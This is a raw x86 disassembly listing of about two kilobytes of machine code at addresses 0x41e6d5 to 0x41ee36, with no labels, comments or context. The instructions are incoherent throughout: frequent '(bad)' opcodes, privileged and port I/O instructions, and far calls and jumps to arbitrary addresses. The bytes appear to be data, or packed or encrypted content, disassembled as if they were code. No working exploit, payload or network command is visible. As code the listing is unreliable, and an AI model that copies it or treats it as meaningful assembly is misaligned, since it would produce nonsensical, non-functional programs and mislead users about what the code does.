  41e6d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e6d7:	sub    BYTE PTR [ebx],0xac
  41e6da:	mov    DWORD PTR [eax+0x6c],0xb76524a5
  41e6e1:	xchg   ebp,eax
  41e6e2:	jl     0x41e6d5
  41e6e4:	push   ebx
  41e6e5:	dec    ebp
  41e6e6:	(bad)  
  41e6e7:	inc    edi
  41e6e8:	pop    ss
  41e6e9:	push   edi
  41e6ea:	fild   QWORD PTR [ebp+0x1c288902]
  41e6f0:	inc    esi
  41e6f1:	ins    DWORD PTR es:[edi],dx
  41e6f2:	stos   BYTE PTR es:[edi],al
  41e6f3:	icebp  
  41e6f4:	push   0x773ad269
  41e6f9:	push   esi
  41e6fa:	add    eax,0xda796a20
  41e6ff:	add    al,0x1c
  41e701:	loope  0x41e6fd
  41e703:	aam    0x4f
  41e705:	es ins BYTE PTR es:[edi],dx
  41e707:	sub    bl,bh
  41e709:	in     al,dx
  41e70a:	mov    ds:0xb8d021cb,eax
  41e70f:	or     cx,bp
  41e712:	test   DWORD PTR [ebx],ebp
  41e714:	popf   
  41e715:	lahf   
  41e716:	sbb    BYTE PTR [ecx-0x4d],ah
  41e719:	aam    0x8b
  41e71b:	sub    ecx,DWORD PTR [eax-0x3]
  41e71e:	lds    esi,FWORD PTR [esi-0x7dd97feb]
  41e724:	pop    edi
  41e725:	imul   edx,eax,0x81e5bf71
  41e72b:	xor    DWORD PTR [edi+eiz*4-0x6d],0xffffff99
  41e730:	mov    al,BYTE PTR [esi+ebx*4]
  41e733:	call   0x88cd:0xb81116da
  41e73a:	mov    bh,BYTE PTR [ebp-0x7c9e3d60]
  41e740:	data16 and cl,BYTE PTR [ebp+0x29]
  41e744:	ret    
  41e745:	xchg   esp,eax
  41e746:	cdq    
  41e747:	push   ds
  41e748:	fst    QWORD PTR [eax+0x5e4d6090]
  41e74e:	xchg   edi,eax
  41e74f:	add    al,0xf8
  41e751:	je     0x41e749
  41e753:	mov    ecx,DWORD PTR [eax]
  41e755:	fmul   DWORD PTR [ebp+0x23da36b8]
  41e75b:	inc    eax
  41e75c:	(bad)  
  41e75d:	shr    DWORD PTR [ecx],cl
  41e75f:	mov    ecx,0xf82a49e9
  41e764:	cmp    al,0xf8
  41e766:	test   eax,0xbedd6d20
  41e76b:	sbb    bh,al
  41e76d:	jmp    0xe06b4b8b
  41e772:	xchg   ebp,eax
  41e773:	adc    ch,BYTE PTR [ecx+0x458d626c]
  41e779:	push   0xabfad736
  41e77e:	jmp    0x31467f40
  41e783:	jmp    0x4161e49a
  41e788:	repnz retf 0x9feb
  41e78c:	add    edx,DWORD PTR fs:0x62a1e261
  41e793:	(bad)  
  41e794:	xor    edx,DWORD PTR [edi+0x582c4e31]
  41e79a:	rcl    BYTE PTR [edi+0x351707b7],1
  41e7a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a1:	add    eax,0x4a5a7137
  41e7a6:	or     DWORD PTR [edx],ecx
  41e7a8:	mov    esp,0xb3a63b2b
  41e7ad:	jp     0x41e828
  41e7af:	and    bh,BYTE PTR [ebx-0x779bc9d7]
  41e7b5:	or     al,dl
  41e7b7:	or     BYTE PTR [ebp+0x4c],bl
  41e7ba:	xor    al,0x3d
  41e7bc:	mov    dl,0xc1
  41e7be:	adc    DWORD PTR [ebp+0x6acf7a0c],eax
  41e7c4:	push   0xff4ead9
  41e7c9:	(bad)  
  41e7ca:	outs   dx,DWORD PTR ds:[esi]
  41e7cb:	jp     0x41e7a2
  41e7cd:	out    dx,eax
  41e7ce:	adc    al,dl
  41e7d0:	pop    ebp
  41e7d1:	test   eax,0x3bb3b844
  41e7d6:	stos   DWORD PTR es:[edi],eax
  41e7d7:	mov    al,ds:0xcfcffe14
  41e7dc:	sub    DWORD PTR [di],0x693e0ddc
  41e7e3:	inc    ebp
  41e7e4:	push   ds
  41e7e5:	dec    eax
  41e7e6:	xor    edx,DWORD PTR [ebx]
  41e7e8:	mov    dh,0xca
  41e7ea:	aad    0x8c
  41e7ec:	and    BYTE PTR [esi+0x16],dl
  41e7ef:	mov    ch,0x8d
  41e7f1:	in     al,dx
  41e7f2:	or     BYTE PTR [ebx+ecx*4-0x2de9395b],al
  41e7f9:	rol    bh,1
  41e7fb:	add    ebp,edi
  41e7fd:	ins    DWORD PTR es:[edi],dx
  41e7fe:	push   ebx
  41e7ff:	dec    ebp
  41e800:	test   ebx,esi
  41e802:	or     eax,0xc7882dcb
  41e807:	and    ebx,DWORD PTR [ebx-0x3c4edc70]
  41e80d:	test   DWORD PTR [eax-0x33],ebx
  41e810:	stc    
  41e811:	or     dh,BYTE PTR [edx+0x25]
  41e814:	mov    esp,0x7eaf65fa
  41e819:	popa   
  41e81a:	jmp    0xe72393bc
  41e81f:	rcpps  xmm4,XMMWORD PTR [ecx]
  41e822:	daa    
  41e823:	lods   al,BYTE PTR ds:[esi]
  41e824:	gs (bad) 
  41e826:	adc    ch,ch
  41e828:	test   al,0x96
  41e82a:	cmp    al,0xe1
  41e82c:	mov    ebx,0x1deba5f5
  41e831:	mov    ds:0xdd542b0f,eax
  41e836:	mov    edx,0x5bcd2b7
  41e83b:	inc    esp
  41e83c:	cs (bad) 
  41e83f:	pop    ds
  41e840:	inc    ebp
  41e841:	jp     0x41e7ca
  41e843:	mov    es,WORD PTR [edi]
  41e845:	inc    edi
  41e846:	xchg   edx,eax
  41e847:	les    ebp,FWORD PTR [edx]
  41e849:	jmp    0xb2740d43
  41e84e:	data16 jle 0x41e8a9
  41e851:	push   esi
  41e852:	hlt    
  41e853:	or     esp,edi
  41e855:	cmp    eax,0x403f1541
  41e85a:	sbb    BYTE PTR [edx-0x2499e99],dh
  41e860:	aas    
  41e861:	or     BYTE PTR [edx-0x27],al
  41e864:	sub    DWORD PTR [esi],edx
  41e866:	ja     0x41e80a
  41e868:	out    0x9c,al
  41e86a:	adc    al,BYTE PTR [ebx+ebp*4-0x1a347e9f]
  41e871:	lea    ebp,[edi+0x6f]
  41e874:	cs jge 0x41e84e
  41e877:	mov    dl,0x8a
  41e879:	xor    dl,BYTE PTR [esi-0x79]
  41e87c:	fisttp WORD PTR [ebx-0x5c2d7845]
  41e882:	push   DWORD PTR [edi-0x2e539f80]
  41e888:	or     al,0xeb
  41e88a:	in     eax,0xd7
  41e88c:	call   0xecc282a3
  41e891:	mov    bh,0xf4
  41e893:	xor    ecx,DWORD PTR [esi]
  41e895:	mov    edx,0xcd20b3f0
  41e89a:	daa    
  41e89b:	test   al,0xc9
  41e89d:	dec    ebx
  41e89e:	jmp    0x41e8dc
  41e8a0:	dec    esi
  41e8a1:	mov    esp,0x562abdc6
  41e8a6:	dec    eax
  41e8a7:	lds    ecx,FWORD PTR [edi]
  41e8a9:	mov    dh,0x75
  41e8ab:	inc    eax
  41e8ac:	sub    ecx,ecx
  41e8ae:	cmp    ecx,0xffffffd2
  41e8b1:	rcr    ah,1
  41e8b3:	in     al,dx
  41e8b4:	mov    al,0x78
  41e8b6:	cmp    eax,0x4de61ce8
  41e8bb:	outs   dx,DWORD PTR ds:[esi]
  41e8bc:	sbb    eax,0xdb5f3ac2
  41e8c1:	aam    0xc7
  41e8c3:	paddb  mm2,QWORD PTR [ecx+esi*8-0x79dfac06]
  41e8cb:	jno    0x41e911
  41e8cd:	das    
  41e8ce:	inc    ebx
  41e8cf:	mov    eax,ds:0xe018f601
  41e8d4:	inc    esi
  41e8d5:	sar    edx,1
  41e8d7:	xchg   esi,eax
  41e8d8:	jecxz  0x41e901
  41e8da:	push   ebp
  41e8db:	pop    esp
  41e8dc:	cmp    edx,DWORD PTR [edx+0x12]
  41e8df:	js     0x41e8b0
  41e8e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e8e2:	jge    0x41e92c
  41e8e4:	mov    ah,dl
  41e8e6:	jo     0x41e8ec
  41e8e8:	push   esi
  41e8e9:	pop    ss
  41e8ea:	cmp    BYTE PTR [edi+0x1321b3fa],bl
  41e8f0:	fsubr  DWORD PTR [edx+edx*2]
  41e8f3:	dec    esi
  41e8f4:	mov    ebp,0x1080b611
  41e8f9:	ret    
  41e8fa:	mov    dl,0x84
  41e8fc:	pop    eax
  41e8fd:	push   edx
  41e8fe:	jnp    0x41e8c4
  41e900:	push   ebp
  41e901:	jge    0x41e921
  41e903:	sbb    BYTE PTR [eax],dl
  41e905:	mov    eax,0x31faae67
  41e90a:	test   dh,cl
  41e90c:	cmp    BYTE PTR [ebx-0x6a],bl
  41e90f:	loope  0x41e980
  41e911:	mov    esp,ecx
  41e913:	in     al,dx
  41e914:	xchg   esp,eax
  41e915:	fcomip st,st(3)
  41e917:	dec    esp
  41e918:	push   esp
  41e919:	xchg   dl,bl
  41e91b:	repz pop eax
  41e91d:	mov    ds:0x1729626e,eax
  41e922:	jmp    0x41e913
  41e924:	les    ebp,FWORD PTR [ecx+0x1a]
  41e927:	pop    esp
  41e928:	fisub  WORD PTR [edi+ebx*1-0x6e]
  41e92c:	inc    ecx
  41e92d:	pop    ebx
  41e92e:	(bad)  [eax+edi*8-0x5a24a826]
  41e935:	push   0x23
  41e937:	js     0x41e933
  41e939:	lds    esp,FWORD PTR [edx+0x2c]
  41e93c:	js     0x41e8e3
  41e93e:	and    cl,cl
  41e940:	aas    
  41e941:	pop    ss
  41e942:	add    BYTE PTR ds:0xf1e2972d,dl
  41e948:	pop    ebx
  41e949:	mov    dl,0x95
  41e94b:	enter  0x9075,0x94
  41e94f:	dec    ecx
  41e950:	(bad)  
  41e951:	fidiv  WORD PTR [edi-0x24]
  41e954:	jecxz  0x41e9bc
  41e956:	cmp    eax,DWORD PTR [esi+0x1015832a]
  41e95c:	in     eax,dx
  41e95d:	sysret 
  41e95f:	fstp   DWORD PTR [edx]
  41e961:	mov    WORD PTR [edi],es
  41e963:	(bad)  
  41e964:	ja     0x41e913
  41e966:	mov    bh,0x93
  41e968:	(bad)  
  41e969:	call   0x70b7:0xdc72f483
  41e970:	stos   DWORD PTR es:[edi],eax
  41e971:	push   esi
  41e972:	test   eax,0x4c84f408
  41e977:	cmc    
  41e978:	int    0x42
  41e97a:	inc    ecx
  41e97b:	or     bh,BYTE PTR [edi-0x6c]
  41e97e:	jae    0x41e9c8
  41e980:	jmp    0x41e947
  41e982:	into   
  41e983:	inc    eax
  41e984:	js     0x41e95e
  41e986:	jge    0x41e9d0
  41e988:	cli    
  41e989:	adc    ch,ah
  41e98b:	push   esp
  41e98c:	inc    ebp
  41e98d:	neg    DWORD PTR [edi+0x27]
  41e990:	xor    BYTE PTR [ecx],cl
  41e992:	fnstenv [ecx-0x5bea8c73]
  41e998:	imul   DWORD PTR [ebx-0x5bce71b5]
  41e99e:	or     eax,0x61f4089f
  41e9a3:	mov    ebp,0xd2f290c0
  41e9a8:	retf   0xf66a
  41e9ab:	jp     0x41ea00
  41e9ad:	loop   0x41e9d0
  41e9af:	in     al,0x61
  41e9b1:	stos   BYTE PTR es:[edi],al
  41e9b2:	das    
  41e9b3:	sub    dh,dh
  41e9b5:	scas   al,BYTE PTR es:[edi]
  41e9b6:	into   
  41e9b7:	jp     0x41ea20
  41e9b9:	or     BYTE PTR [ecx],al
  41e9bb:	push   cs
  41e9bc:	inc    edx
  41e9bd:	popa   
  41e9be:	sub    al,0x6a
  41e9c0:	xchg   esi,eax
  41e9c1:	lods   eax,DWORD PTR ds:[esi]
  41e9c2:	jbe    0x41e9fd
  41e9c4:	cmp    bl,BYTE PTR [esi]
  41e9c6:	jecxz  0x41e951
  41e9c8:	mov    cl,0x1b
  41e9ca:	in     eax,0x60
  41e9cc:	ins    DWORD PTR es:[edi],dx
  41e9cd:	pusha  
  41e9ce:	popf   
  41e9cf:	cmp    eax,0x70f42419
  41e9d4:	shl    BYTE PTR [ebp+0x4f4955cf],1
  41e9da:	scas   eax,DWORD PTR es:[edi]
  41e9db:	pop    es
  41e9dc:	add    al,0x7c
  41e9de:	daa    
  41e9df:	mov    ebp,0x5d468781
  41e9e4:	mov    ecx,0xacd54acb
  41e9e9:	mov    al,ds:0xb883cfbe
  41e9ee:	pop    esi
  41e9ef:	mov    ecx,0x82814a7
  41e9f4:	icebp  
  41e9f5:	jecxz  0x41ea63
  41e9f7:	mov    eax,0x5c63052c
  41e9fc:	loopne 0x41ea34
  41e9fe:	call   0x24ceab8a
  41ea03:	jbe    0x41ea03
  41ea05:	shl    BYTE PTR [edx-0x2e389a09],1
  41ea0b:	and    esp,0x26166864
  41ea11:	imul   edx,DWORD PTR [edi+0x20],0x8b4c6864
  41ea18:	sub    BYTE PTR [ebp-0x7abfc9f],dl
  41ea1e:	and    edi,edi
  41ea20:	fld    st(3)
  41ea22:	xchg   esp,eax
  41ea23:	inc    esp
  41ea24:	bound  eax,QWORD PTR [ebp-0x3ceba75e]
  41ea2a:	sub    BYTE PTR es:[ebx+0x2b],ch
  41ea2e:	pusha  
  41ea2f:	imul   ebp,edi,0x892c060d
  41ea35:	jne    0x41ea23
  41ea37:	sar    BYTE PTR [ebp-0x57f30f30],cl
  41ea3d:	mov    eax,0x9ab0316
  41ea42:	in     al,dx
  41ea43:	stos   BYTE PTR es:[edi],al
  41ea44:	xchg   BYTE PTR [ebp+0xc],dl
  41ea47:	dec    edx
  41ea48:	in     eax,dx
  41ea49:	xchg   edi,eax
  41ea4a:	retf   0x69d5
  41ea4d:	sbb    dl,dh
  41ea4f:	call   0x120f1356
  41ea54:	clc    
  41ea55:	arpl   WORD PTR ds:0x82256f2f,dx
  41ea5b:	jecxz  0x41ea67
  41ea5d:	pusha  
  41ea5e:	lods   al,BYTE PTR ds:[esi]
  41ea5f:	sub    eax,DWORD PTR [edx+0xc8402b3]
  41ea65:	pop    edi
  41ea66:	xlat   BYTE PTR ds:[ebx]
  41ea67:	shl    DWORD PTR [ecx],1
  41ea69:	in     eax,dx
  41ea6a:	pop    eax
  41ea6b:	ins    BYTE PTR es:[edi],dx
  41ea6c:	or     ebp,esp
  41ea6e:	mov    ch,al
  41ea70:	pop    eax
  41ea71:	in     al,dx
  41ea72:	add    al,0x75
  41ea74:	sbb    ecx,DWORD PTR [esi+0x25]
  41ea77:	dec    esi
  41ea78:	fist   DWORD PTR [eax-0xb42a9eb]
  41ea7e:	outs   dx,BYTE PTR ds:[esi]
  41ea7f:	push   edx
  41ea80:	cmc    
  41ea81:	in     al,dx
  41ea82:	dec    ecx
  41ea83:	gs lock clc 
  41ea86:	jne    0x41eab8
  41ea88:	inc    ecx
  41ea89:	mov    eax,ds:0x7f75c221
  41ea8e:	addr16 or eax,0xec2933db
  41ea94:	adc    cl,BYTE PTR [esi-0x484ea611]
  41ea9a:	jnp    0x41ea90
  41ea9c:	dec    edx
  41ea9d:	pop    es
  41ea9e:	das    
  41ea9f:	(bad)  
  41eaa1:	or     BYTE PTR [ebx+0x4e58f6c9],dl
  41eaa7:	push   edx
  41eaa8:	idiv   DWORD PTR [esi*1-0x2baf1ac7]
  41eaaf:	mov    eax,ds:0x3a5ef4aa
  41eab4:	ja     0x41ea3c
  41eab6:	jmp    0x41ea81
  41eab8:	in     eax,dx
  41eab9:	div    DWORD PTR [ecx-0x2b8252a1]
  41eabf:	adc    ecx,DWORD PTR [ebp+0x5e6216f3]
  41eac5:	dec    esp
  41eac6:	aam    0x58
  41eac8:	clc    
  41eac9:	hlt    
  41eaca:	inc    esi
  41eacb:	pusha  
  41eacc:	mov    ds:0x96def3ef,eax
  41ead1:	(bad)  
  41ead3:	addr16 dec esi
  41ead5:	xchg   ebx,eax
  41ead6:	test   BYTE PTR [ebx],dh
  41ead8:	push   0xffffff8a
  41eada:	in     al,0x63
  41eadc:	dec    esi
  41eadd:	aam    0x77
  41eadf:	mov    ecx,0xa1c85a5c
  41eae4:	jmp    0x41ea81
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	mov    ah,0xe0
  41eae9:	sbb    al,0x5d
  41eaeb:	ficom  DWORD PTR [esi]
  41eaed:	out    0xa5,al
  41eaef:	xor    BYTE PTR [edx],bh
  41eaf1:	and    cl,BYTE PTR [eiz*8-0x7ada6167]
  41eaf8:	not    DWORD PTR fs:[edx]
  41eafb:	lahf   
  41eafc:	adc    DWORD PTR [ebp-0x7c],eax
  41eaff:	push   edx
  41eb00:	popa   
  41eb01:	lock jle 0x41eae9
  41eb04:	or     DWORD PTR [edx+0x4a],0x8eab2d7b
  41eb0b:	nop
  41eb0c:	jno    0x41eaa2
  41eb0e:	mov    cl,0x5b
  41eb10:	(bad)  
  41eb11:	sahf   
  41eb12:	aam    0x72
  41eb14:	add    dl,BYTE PTR [eax-0x3f]
  41eb17:	adc    bh,cl
  41eb19:	inc    ebx
  41eb1a:	mov    bl,0xe4
  41eb1c:	dec    ebp
  41eb1d:	loope  0x41eae6
  41eb1f:	push   edi
  41eb20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb21:	adc    BYTE PTR [ebp-0x60],0x29
  41eb25:	jg     0x41eadb
  41eb27:	mov    eax,0x651b9582
  41eb2c:	xchg   esi,eax
  41eb2d:	and    WORD PTR [eax+0x4faa77cc],bp
  41eb34:	fs xchg bx,ax
  41eb37:	jbe    0x41ead9
  41eb39:	jae    0x41eb18
  41eb3b:	xchg   esi,eax
  41eb3c:	mov    DWORD PTR ds:0x7d969e06,esi
  41eb42:	mov    ebp,0xa05e5b6c
  41eb47:	ror    DWORD PTR [ebp-0x50a4b4ae],0x1f
  41eb4e:	cmc    
  41eb4f:	cmp    DWORD PTR [ebx+0x31365f8],esi
  41eb55:	xor    BYTE PTR ds:[esi],ch
  41eb58:	mov    ah,bl
  41eb5a:	mov    WORD PTR [edi],es
  41eb5c:	into   
  41eb5d:	xchg   DWORD PTR [eax+0x6a38bdb1],esp
  41eb63:	fisttp QWORD PTR [eax]
  41eb65:	in     al,0xe3
  41eb67:	dec    edi
  41eb68:	iret   
  41eb69:	jne    0x41eb76
  41eb6b:	jbe    0x41eb5d
  41eb6d:	sbb    al,0xb8
  41eb6f:	ror    DWORD PTR [ebp+ebp*2+0x32bfef8b],0xb0
  41eb77:	xor    dl,BYTE PTR [edx+0xa]
  41eb7a:	fdiv   QWORD PTR [edi-0x15864a6c]
  41eb80:	cld    
  41eb81:	sti    
  41eb82:	inc    esp
  41eb83:	xor    bl,BYTE PTR [esi-0x3675d865]
  41eb89:	iret   
  41eb8a:	mov    al,0x4f
  41eb8c:	xchg   BYTE PTR ds:0x2cc25640,bl
  41eb92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb93:	mov    bl,0xff
  41eb95:	or     BYTE PTR [ecx+eax*1+0x1d],bh
  41eb99:	iret   
  41eb9a:	cmp    eax,0xa4bd886f
  41eb9f:	push   esp
  41eba0:	sub    eax,0x8b5df1d4
  41eba5:	ret    0xe189
  41eba8:	inc    eax
  41eba9:	and    edx,esi
  41ebab:	push   cs
  41ebac:	adc    dh,BYTE PTR [eax]
  41ebae:	jecxz  0x41eba1
  41ebb0:	repz popa 
  41ebb2:	xor    al,0xcb
  41ebb4:	cwde   
  41ebb5:	mov    ds:0xef29e2f6,al
  41ebba:	adc    DWORD PTR [eax+0x64],esi
  41ebbd:	ret    
  41ebbe:	pop    ss
  41ebbf:	cmc    
  41ebc0:	pop    DWORD PTR [ecx+0x50]
  41ebc3:	popf   
  41ebc4:	int    0xc5
  41ebc6:	dec    ebp
  41ebc7:	bound  esp,QWORD PTR ds:0xb218330d
  41ebcd:	jl     0x41ebc7
  41ebcf:	iret   
  41ebd0:	dec    ebx
  41ebd1:	xor    al,0x40
  41ebd3:	in     al,0x42
  41ebd5:	test   al,0xcd
  41ebd7:	mov    ebp,0x258b0c92
  41ebdc:	mov    al,BYTE PTR [edi+0x5f549f49]
  41ebe2:	and    al,0x2c
  41ebe4:	mov    ds:0xebd4bbc1,eax
  41ebe9:	das    
  41ebea:	call   0x9820d585
  41ebef:	inc    cx
  41ebf1:	pusha  
  41ebf2:	and    edi,DWORD PTR [esi]
  41ebf4:	jg     0x41ec2b
  41ebf6:	rol    BYTE PTR [esp+eiz*2],cl
  41ebf9:	push   cs
  41ebfa:	popa   
  41ebfb:	test   DWORD PTR [ebp-0xe],eax
  41ebfe:	stos   BYTE PTR es:[edi],al
  41ebff:	std    
  41ec00:	or     BYTE PTR [edx],bh
  41ec02:	sub    DWORD PTR [edx],ebx
  41ec04:	fnstenv [ebx+0x4]
  41ec07:	cwde   
  41ec08:	inc    esi
  41ec09:	dec    edx
  41ec0a:	xchg   esp,eax
  41ec0b:	jb     0x41ec24
  41ec0d:	adc    eax,0x476a88a
  41ec12:	mov    eax,0x18ee4403
  41ec17:	push   ds
  41ec18:	mov    al,0x38
  41ec1a:	das    
  41ec1b:	dec    ebp
  41ec1c:	hlt    
  41ec1d:	mov    eax,0x7661c5d3
  41ec22:	mov    ebx,0xf1599b2d
  41ec27:	jns    0x41ec06
  41ec29:	popa   
  41ec2a:	push   ebx
  41ec2b:	or     BYTE PTR [esi],0x18
  41ec2e:	mov    eax,ds:0x84c4743
  41ec33:	repnz icebp 
  41ec35:	das    
  41ec36:	loope  0x41ec90
  41ec38:	or     esi,edx
  41ec3a:	shl    DWORD PTR [eax+0x156ff146],1
  41ec40:	hlt    
  41ec41:	jo     0x41ecc1
  41ec43:	cmp    ebx,edx
  41ec45:	dec    edx
  41ec46:	aaa    
  41ec47:	repnz push esp
  41ec49:	ins    BYTE PTR es:[edi],dx
  41ec4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec4b:	mov    WORD PTR [ecx],?
  41ec4d:	aas    
  41ec4e:	cmp    BYTE PTR [esi+0x1e2cb1b4],bh
  41ec54:	aaa    
  41ec55:	ins    BYTE PTR es:[edi],dx
  41ec56:	xchg   ebp,eax
  41ec57:	xor    DWORD PTR [eax+0x34],ebp
  41ec5a:	and    esi,DWORD PTR [ecx+0x3a]
  41ec5d:	inc    eax
  41ec5e:	push   ecx
  41ec5f:	inc    edi
  41ec60:	jmp    0xdc8e364e
  41ec65:	jo     0x41ecca
  41ec67:	push   0xfffffff0
  41ec69:	aam    0x3f
  41ec6b:	xor    eax,0xd8505bf5
  41ec70:	jae    0x41ec39
  41ec72:	ret    
  41ec73:	sbb    edi,DWORD PTR [edi]
  41ec75:	xchg   ecx,eax
  41ec76:	test   eax,0x465d211e
  41ec7b:	cmp    bl,BYTE PTR [edx+0x5348e4cd]
  41ec81:	push   ebx
  41ec82:	cli    
  41ec83:	dec    esp
  41ec84:	jp     0x41ec16
  41ec86:	mov    dh,0x47
  41ec88:	stos   BYTE PTR es:[edi],al
  41ec89:	xchg   ebx,eax
  41ec8a:	pop    ebp
  41ec8b:	or     al,0x2f
  41ec8d:	fcomp  QWORD PTR [ebp+0x4]
  41ec90:	xor    ah,BYTE PTR [ebx-0x790f32bc]
  41ec96:	fisub  DWORD PTR [eax*2-0x51c66804]
  41ec9d:	inc    esp
  41ec9e:	pop    esi
  41ec9f:	imul   edi,ebx,0x14
  41eca2:	sbb    DWORD PTR [ecx],ebx
  41eca4:	neg    DWORD PTR [ebp+0x34]
  41eca7:	and    ecx,ecx
  41eca9:	cmp    al,BYTE PTR [ebx+0x22d4dbce]
  41ecaf:	mov    ebp,DWORD PTR [esi+0x1f9a5ae]
  41ecb5:	ss inc esi
  41ecb7:	ret    
  41ecb8:	sbb    eax,esp
  41ecba:	in     al,dx
  41ecbb:	push   ebp
  41ecbc:	dec    esp
  41ecbd:	popa   
  41ecbe:	mov    ecx,0xf0771a83
  41ecc3:	lods   eax,DWORD PTR ds:[esi]
  41ecc4:	test   eax,0x55d78260
  41ecc9:	mov    bl,BYTE PTR [esi+0x74]
  41eccc:	add    al,0x9e
  41ecce:	int3   
  41eccf:	xor    eax,0x982e63
  41ecd4:	into   
  41ecd5:	call   0xf47993e9
  41ecda:	cmp    DWORD PTR [ebp+0x2b929a53],0xffffffc5
  41ece1:	sub    esi,DWORD PTR [edi+0x24]
  41ece4:	fmulp  st(4),st
  41ece6:	xor    dl,BYTE PTR [esi]
  41ece8:	adc    eax,0x7751816a
  41eced:	xchg   ebp,eax
  41ecee:	mov    bl,0x57
  41ecf0:	push   esi
  41ecf1:	xchg   edx,eax
  41ecf2:	fisub  WORD PTR [edi]
  41ecf4:	sbb    al,0x12
  41ecf6:	dec    edx
  41ecf7:	add    eax,0xc391c2c9
  41ecfc:	mov    ds:0x4a2409ab,al
  41ed01:	jge    0x41ec89
  41ed03:	mov    eax,0x4e4e6421
  41ed08:	ins    DWORD PTR es:[edi],dx
  41ed09:	xchg   esi,eax
  41ed0a:	sbb    al,0x7e
  41ed0c:	sub    eax,DWORD PTR [ebx]
  41ed0e:	and    al,0xa4
  41ed10:	(bad)  
  41ed11:	sub    esi,DWORD PTR [ebx+0x12aebe37]
  41ed17:	xchg   edx,eax
  41ed18:	inc    eax
  41ed19:	add    dh,cl
  41ed1b:	cmp    al,0xd
  41ed1d:	(bad)  
  41ed1e:	iret   
  41ed1f:	cmp    ch,BYTE PTR [esi-0x4e021b82]
  41ed25:	popf   
  41ed26:	pop    esp
  41ed27:	pop    ebx
  41ed28:	jl     0x41ed32
  41ed2a:	and    al,0xfd
  41ed2c:	cmp    BYTE PTR [edx],dh
  41ed2e:	jle    0x41ed94
  41ed30:	loope  0x41ed7f
  41ed32:	dec    BYTE PTR [bp+si-0x2b]
  41ed36:	sahf   
  41ed37:	dec    esp
  41ed38:	push   ecx
  41ed39:	mul    DWORD PTR [esi+0xfd81196]
  41ed3f:	or     ah,bh
  41ed41:	or     ah,BYTE PTR [eax-0x10]
  41ed44:	jns    0x41ed83
  41ed46:	dec    ebx
  41ed47:	mov    ds:0x69c6df62,eax
  41ed4c:	add    BYTE PTR [ecx-0x21],dl
  41ed4f:	icebp  
  41ed50:	dec    edx
  41ed51:	sbb    cl,dh
  41ed53:	push   es
  41ed54:	fidiv  DWORD PTR [edi-0x1499f4b9]
  41ed5a:	arpl   WORD PTR [esi-0x46],dx
  41ed5d:	add    al,0x51
  41ed5f:	mov    ah,0x72
  41ed61:	and    eax,0xf6f4192e
  41ed66:	pop    ebp
  41ed67:	stc    
  41ed68:	push   ds
  41ed69:	sbb    eax,0x938fbb37
  41ed6e:	mov    bh,0xe
  41ed70:	loope  0x41edd9
  41ed72:	scas   eax,DWORD PTR es:[edi]
  41ed73:	cli    
  41ed74:	leave  
  41ed75:	fcomp  DWORD PTR [edi+0x7f4e1f2f]
  41ed7b:	sbb    ah,BYTE PTR ds:0xd8cd86a0
  41ed81:	pop    edx
  41ed82:	arpl   sp,dx
  41ed84:	(bad)  
  41ed86:	ret    0xad60
  41ed89:	lds    esp,FWORD PTR [edi+eax*8]
  41ed8c:	outs   dx,DWORD PTR ds:[esi]
  41ed8d:	std    
  41ed8e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ed8f:	mov    ?,WORD PTR [eax+0x571bca10]
  41ed95:	lahf   
  41ed96:	loop   0x41ee16
  41ed98:	add    ch,al
  41ed9a:	sub    cl,BYTE PTR [edi+eax*8-0x2ecfd50d]
  41eda1:	sbb    ecx,ebx
  41eda3:	loopne 0x41ed42
  41eda5:	xor    eax,0x5196f1d4
  41edaa:	shl    DWORD PTR [eax+0x36],0xd0
  41edae:	xchg   edi,eax
  41edaf:	push   ebp
  41edb0:	sub    dh,BYTE PTR [esi+0x7c]
  41edb3:	addr16 out dx,al
  41edb5:	dec    ebp
  41edb6:	in     eax,dx
  41edb7:	inc    esp
  41edb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edb9:	inc    eax
  41edba:	jle    0x41ed90
  41edbc:	rcr    BYTE PTR [ebp-0x36],cl
  41edbf:	jle    0x41ee37
  41edc1:	sti    
  41edc2:	scas   eax,DWORD PTR es:[edi]
  41edc3:	add    BYTE PTR [ebp-0x13c9b71b],dh
  41edc9:	int    0xde
  41edcb:	cli    
  41edcc:	adc    BYTE PTR [ecx-0x34bbb35d],ch
  41edd2:	hlt    
  41edd3:	jecxz  0x41edc2
  41edd5:	mov    cl,0x2f
  41edd7:	xchg   esi,eax
  41edd8:	mov    cs,WORD PTR [ecx-0x19]
  41eddb:	outs   dx,BYTE PTR ds:[esi]
  41eddc:	je     0x41edf0
  41edde:	data16 (bad) 
  41ede0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ede1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ede2:	loope  0x41ee26
  41ede4:	stc    
  41ede5:	add    ebp,DWORD PTR ds:0x1ee1a203
  41edeb:	mov    edi,0xd9348d94
  41edf0:	adc    eax,0x26cc65d1
  41edf5:	pusha  
  41edf6:	and    ecx,DWORD PTR [edi]
  41edf8:	push   esp
  41edf9:	aas    
  41edfa:	lea    ebx,[ebx]
  41edfc:	je     0x41ee55
  41edfe:	les    ebp,FWORD PTR [ecx*4+0x4436ca2a]
  41ee05:	ret    
  41ee06:	bound  esp,QWORD PTR [edi-0x4b]
  41ee09:	mov    edx,0x5737a1e3
  41ee0e:	std    
  41ee0f:	push   ecx
  41ee10:	shl    bl,1
  41ee12:	mov    eax,DWORD PTR [ebx+edx*1+0x5e]
  41ee16:	xor    eax,0x4a1e12bc
  41ee1b:	adc    ecx,DWORD PTR [esi-0x47]
  41ee1e:	push   ds
  41ee1f:	inc    esp
  41ee20:	xor    al,0x7e
  41ee22:	xor    DWORD PTR [ebp+0x65467c0c],ebx
  41ee28:	jbe    0x41ee39
  41ee2a:	sub    ch,dh
  41ee2c:	int3   
  41ee2d:	or     ecx,DWORD PTR [ebx+ebx*1-0x1e]
  41ee31:	bswap  edi
  41ee33:	adc    ecx,DWORD PTR [edx]
  41ee35:	sti    
  41ee36:	test   DWORD PTR [ecx+0x7f],esi
